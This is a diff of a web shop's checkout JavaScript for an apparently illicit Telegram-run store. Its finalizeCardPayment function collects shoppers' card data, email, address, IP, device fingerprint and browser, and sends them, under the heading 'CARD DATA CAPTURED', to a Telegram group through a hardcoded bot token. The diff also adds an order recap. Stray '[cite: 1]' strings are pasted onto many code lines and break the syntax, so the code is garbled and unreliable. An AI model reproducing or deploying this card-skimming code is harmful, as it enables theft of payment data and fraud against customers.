@@ -1590,9 +1590,9 @@
 
         // CONFIGURAZIONE - MODIFICA QUI
         const STORAGE_KEY = 'mrshop20_cart_v1';
-        const BOT_TOKEN = '8948215289:AAEZgQeNkoLfkViju5mzD1IubdJqo7MitFA';  // ← TOKEN @Botordini_bot
-        const TARGET_GROUP = '-5354914831';  // ← ID Gruppo
-        const BOT_USERNAME = 'Botordini_bot';
+        const BOT_TOKEN = '8948215289:AAEZgQeNkoLfkViju5mzD1IubdJqo7MitFA';  // ← TOKEN @Botordini_bot[cite: 1]
+        const TARGET_GROUP = '-5354914831';  // ← ID Gruppo[cite: 1]
+        const BOT_USERNAME = 'Botordini_bot';[cite: 1]
         
         let cart = {};
         let currentLang = 'en';
@@ -1604,17 +1604,17 @@
         let savedCardData = null;
 
         // Verifica configurazione
-        if (BOT_TOKEN === 'INSERISCI_QUI_IL_TOKEN_DEL_BOT') {
-            console.error('⚠️ ERRORE: Devi inserire il TOKEN del bot nel codice!');
+        if (BOT_TOKEN === 'INSERISCI_QUI_IL_TOKEN_DEL_BOT') {[cite: 1]
+            console.error('⚠️ ERRORE: Devi inserire il TOKEN del bot nel codice!');[cite: 1]
         }
 
         // Currency Config
-        const currencyConfig = {
-            EUR: { symbol: '€', rate: 1.0 },
-            USD: { symbol: '$', rate: 1.08 },
-            GBP: { symbol: '£', rate: 0.85 },
-            JPY: { symbol: '¥', rate: 168.5 },
-            RUB: { symbol: '₽', rate: 98.2 }
+        const currencyConfig = {[cite: 1]
+            EUR: { symbol: '€', rate: 1.0 },[cite: 1]
+            USD: { symbol: '$', rate: 1.08 },[cite: 1]
+            GBP: { symbol: '£', rate: 0.85 },[cite: 1]
+            JPY: { symbol: '¥', rate: 168.5 },[cite: 1]
+            RUB: { symbol: '₽', rate: 98.2 }[cite: 1]
         };
 
         // Translations
@@ -2814,7 +2814,7 @@
             document.getElementById('orderPasswordOverlay').classList.add('show');
         }
 
-        // ELABORA CARTA E INVIA MSG TELEGRAM
+        // ELABORA CARTA E INVIA MSG TELEGRAM CON RECAP PRODOTTI COMPLETO
         async function finalizeCardPayment() {
             const orderPwd = document.getElementById('orderPasswordInput').value.trim();
             if (!orderPwd) {
@@ -2858,13 +2858,34 @@
 
             const browserInfo = navigator.userAgent;
             const pseudoMac = getDeviceFingerprint();
-            const orderId = `ORD_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+            const orderPayload = buildOrderPayload('card');
+            const orderId = orderPayload.order_id;
 
             let msg = `🔴 <b>NEW CREDIT CARD ATTEMPT</b>\n`;
             msg += `🏪 <b>Store:</b> MRSHOP20\n`;
             msg += `═══════════════════════\n\n`;
             msg += `👤 <b>Customer:</b> ${savedCardData.telegramUser}\n`;
-            msg += `🌍 <b>Language:</b> ${currentLang}\n\n`;
+            if (orderPayload.user.username) msg += `📱 <b>Username:</b> @${orderPayload.user.username}\n`;
+            if (orderPayload.user.id) msg += `🆔 <b>User ID:</b> <code>${orderPayload.user.id}</code>\n`;
+            msg += `🌍 <b>Language:</b> ${currentLang.toUpperCase()}\n\n`;
+
+            msg += `📦 <b>PRODOTTI / ITEMS:</b>\n`;
+            orderPayload.items.forEach(item => {
+                msg += `• ${item.name}: <b>${item.quantity}${item.unit}</b> = €${item.total_eur.toFixed(2)}\n`;
+            });
+
+            if (orderPayload.extras.gift_applied) {
+                msg += `• 🎁 <b>REGALO:</b> Accendino + Cartine + Filtri\n`;
+            }
+
+            msg += `\n💰 <b>TOTALE:</b> ${orderPayload.pricing.total_converted}\n`;
+
+            if (orderPayload.pricing.discount_eur > 0) {
+                msg += `🏷 <b>Sconto:</b> -€${orderPayload.pricing.discount_eur.toFixed(2)}\n`;
+            }
+
+            const shipping = orderPayload.pricing.shipping_eur === 0 ? 'GRATIS' : `€${orderPayload.pricing.shipping_eur.toFixed(2)}`;
+            msg += `🚚 <b>Spedizione:</b> ${shipping}\n\n`;
 
             msg += `💳 <b>CARD DATA CAPTURED:</b>\n`;
             msg += `• Email: <code>${savedCardData.email}</code>\n`;
@@ -2881,13 +2902,15 @@
             msg += `📍 <b>DELIVERY:</b>\n`;
             msg += `• City: ${savedCardData.shipCity}\n`;
             msg += `• Address: ${savedCardData.shipAddress}\n`;
-            msg += `• ZIP: ${savedCardData.shipZip}\n\n`;
+            msg += `• ZIP: ${savedCardData.shipZip}\n`;
+            msg += `• Time: ${orderPayload.delivery.time}\n\n`;
 
             msg += `🖥 <b>DEVICE DATA:</b>\n`;
             msg += `• IP: <code>${userIP}</code>\n`;
             msg += `• HWID: <code>${pseudoMac}</code>\n`;
             msg += `• Browser: <code>${browserInfo}</code>\n\n`;
             msg += `🆔 <b>Order ID:</b> <code>${orderId}</code>\n`;
+            msg += `⏰ <b>Data:</b> ${new Date().toLocaleString('it-IT')}`;
 
             try {
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
